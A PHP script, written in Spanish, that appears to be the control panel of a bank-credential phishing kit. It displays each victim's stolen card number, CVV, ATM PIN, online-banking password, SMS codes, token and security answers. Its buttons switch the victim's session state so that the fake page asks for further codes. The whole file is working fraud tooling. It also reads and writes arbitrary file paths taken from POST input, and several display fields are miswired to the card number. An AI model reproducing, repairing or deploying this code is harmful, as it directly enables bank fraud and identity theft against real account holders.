<?php
if(!isset($_POST["op"])){
    echo "no se ha definido opcion";
    exit();
}
$op = trim($_POST["op"]);

switch ($op) {
    case "listar":
        if(!isset($_POST["archivoUsuario"])){
            echo "no se ha archivo Usuario";
            exit();
        }
        $archivoUsuario = trim($_POST["archivoUsuario"]);
        if($archivoUsuario == ""){
            echo "parametro archivo usuario incorrecto";
            exit();
        }   
        $datosStringJsonUsuario = @file_get_contents($archivoUsuario);
        if($datosStringJsonUsuario === false){
            echo "error g";            
        }
        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);

        $dd = $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"];        
        
        
        $color="";
        if($dd == "gifCargando"){
            $color = "yellow";
        }
        
        
        echo "
        
        
        <div id='iEstado' >
            <table border='1' cellspacing='0' cellpadding='7' >           
            
            
            <tr>
                <th colspan='2'>INFORMACION ESTADO</th>
            </tr>
            <tr>
                <td>estadoActual</td>
                <td>{$datosObjetoJsonUsuario["informacionEstado"]["estadoActual"]}</td>
           </tr>
           
        </table>
        </div>       
        
        <div id='dLogin'>
            <table border='1' cellspacing='0' cellpadding='7' >  
            <tr>
                <th colspan='2'>DATOS LOGIN</th>
            </tr>
            <tr>
                <td><strong>numeroKeyPadX</strong></td>
                <td>{$datosObjetoJsonUsuario["datosLogin"]["numeroKeyPadX"]}</td>
            </tr>
            <tr>
                <td><strong>tipoTarjeta</strong></td>
                <td>{$datosObjetoJsonUsuario["datosLogin"]["tipoTarjeta"]}</td>
            </tr>
            <tr>
                <td><strong>numeroTarjetaUsuario</strong></td>
                <td>{$datosObjetoJsonUsuario["datosLogin"]["numeroTarjetaUsuario"]}</td>
            </tr>
            <tr>
                <td><strong>claveBancaInternet</strong></td>
                <td>{$datosObjetoJsonUsuario["datosLogin"]["claveBancaInternet"]}</td>
            </tr>
            
        </table>
        </div>
        

        <div id='dCompletoTarjeta'>
            <table border='1' cellspacing='0' cellpadding='7' >   
            
            <tr>
                <th colspan='2'>DATOS COMPLETO TARJETA</th>
            </tr>
            <tr>
                <td><strong>numeroTarjetaCompleto</strong></td>
                <td>{$datosObjetoJsonUsuario['datosCompletosDeTarjeta']['numeroTarjetaCompleto']}</td>
            </tr>
            <tr>
                <td><strong>fechaDeExpiracion</strong></td>
                <td>{$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["numeroTarjetaCompleto"]}</td>
            </tr>
            <tr>
                <td><strong>cvv</strong></td>
                <td>{$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["numeroTarjetaCompleto"]}</td>
            </tr>
            <tr>
                <td><strong>claveAtm</strong></td>
                <td>{$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["numeroTarjetaCompleto"]}</td>
            </tr>         
            <tr>
                <td><strong>dniTitular</strong></td>
                <td>{$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["dniTitular"]}</td>
            </tr>
            <tr>
                <td><strong>numeroCelularTitular</strong></td>
                <td>{$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["numeroTarjetaCompleto"]}</td>
            </tr>
        </table>
        </div>
        
        <div id='dValidacion'>
            <table border='1' cellspacing='0' cellpadding='7' >
            <tr>
                <th colspan='2'>DATOS DE VALIDACION</th>
            </tr>
            <tr>
                <td><strong>sms</strong></td>
                <td>{$datosObjetoJsonUsuario["datosDeValidacion"]["sms"]}</td>
            </tr>
            <tr>
                <td><strong>claveToken</strong></td>
                <td>{$datosObjetoJsonUsuario["datosDeValidacion"]["claveToken"]}</td>
            </tr>
            <tr>
                <td><strong>nombreTitular</strong></td>
                <td>{$datosObjetoJsonUsuario["datosDeValidacion"]["nombreTitular"]}</td>
            </tr>
            <tr>
                <td><strong>preguntaSeguridad1</strong></td>
                <td>{$datosObjetoJsonUsuario["datosDeValidacion"]["preguntaSeguridad1"]}</td>
            </tr>
            <tr>
                <td><strong>respuestaSeguridad1</strong></td>
                <td>{$datosObjetoJsonUsuario["datosDeValidacion"]["respuestaSeguridad1"]}</td>
            </tr>                        
        </table>
        </div>
        
        
        <div id='dAcciones'>
            <table border='1' cellspacing='0' cellpadding='7' >
            <tr>
                <th colspan='2'>ACCIONES</th>
            </tr>
            <tr>
                <td><input  type='button' value='Nombre Usuario' onclick=\"establecerNombreCuenta('$archivoUsuario')\"  ></td>
                <td><input  type='button' value='Digital Token' onclick=\"solicitarSoloDigitalToken('$archivoUsuario')\"  ></td>
            </tr>
            <tr>
                <td><input  type='button' value='CC' onclick=\"solicitarCc('$archivoUsuario')\"  ></td>
                <td><input  type='button' value='Pregunta'></td>
            </tr>
            <tr>
                <td><input  type='button' value='Pregunta y Digital Token' onclick=\"solicitarPreguntaDigitalToken('$archivoUsuario')\" ></td>
                <td><input  type='button' value='Finalizar' onclick=\"solicitarCc('$archivoUsuario')\" ></td>
            </tr>                              
        </table>
        </div>
        
        
        
        ";

                
        break;

        case "establecerNombreCuenta":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
        
        if(!isset($_POST['person'])){
            echo "parametro post person invalido";
            exit();
        }
        $person = trim($_POST['person']);
        if($person == ""){
            echo "parametro post person incorrecto";
            exit();
        }
        
        
        
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["datosDeValidacion"]["nombreTitular"] = $person;

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto";



        exit();
        break;
        
        
        case "solicitarPreguntaDigitalToken":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
        
        if(!isset($_POST['preguntaDigitalTokenX'])){
            echo "parametro post preguntaDigitalTokenX invalido";
            exit();
        }
        $preguntaDigitalTokenX = trim($_POST['preguntaDigitalTokenX']);
        if($preguntaDigitalTokenX == ""){
            echo "parametro post preguntaDigitalTokenX incorrecto";
            exit();
        }     
        
        
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);
        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "preguntaDigitalToken";        
        $datosObjetoJsonUsuario["datosDeValidacion"]["preguntaSeguridad1"] = $preguntaDigitalTokenX;
        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto pregunta digital token";



        exit();
        break;
        
        
        
        
        
        
        case "solicitarCc":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
    
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "cc";

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto";



        exit();
        break;      
        
        
        case "solicitarSoloDigitalToken":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
    
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "soloDigitalToken";

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto";



        exit();
        break;
        
        
        case "finalizar":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
    
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "fin";

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "proceso correto : finalizar";



        exit();
        break;
        
        case "solicitarSms":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
    
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "sms";

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto";



        exit();
        break;


        case "solicitarSms2":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
    
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "sms2";

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto";



        exit();
        break;


        case "finalizar":
    
 
        if(!isset($_POST['archivoToken'])){
            echo "parametro post archivoToken invalido";
            exit();
        }  
        $archivoToken = trim($_POST['archivoToken']);
        if($archivoToken == ""){
            echo "parametro post archivoToken incorrecto";
            exit();
        }
        if(!file_exists($archivoToken)){
            echo "archivoToken no existe";
            exit();
        }
    
        $datosStringJsonUsuario = @file_get_contents($archivoToken);
        if($datosStringJsonUsuario === false){
            echo "error g";
            exit();
        }

        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);


        $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"] = "fin";

        
        $infoEnFormatoJson = json_encode($datosObjetoJsonUsuario,JSON_HEX_APOS);
        $fo = fopen($archivoToken,"w");
        fwrite($fo,$infoEnFormatoJson);
        fclose($fo);

        echo "correcto";


        exit();
        break;
        
        
    default:
        echo "opcion invalida";
        exit();
        break;
}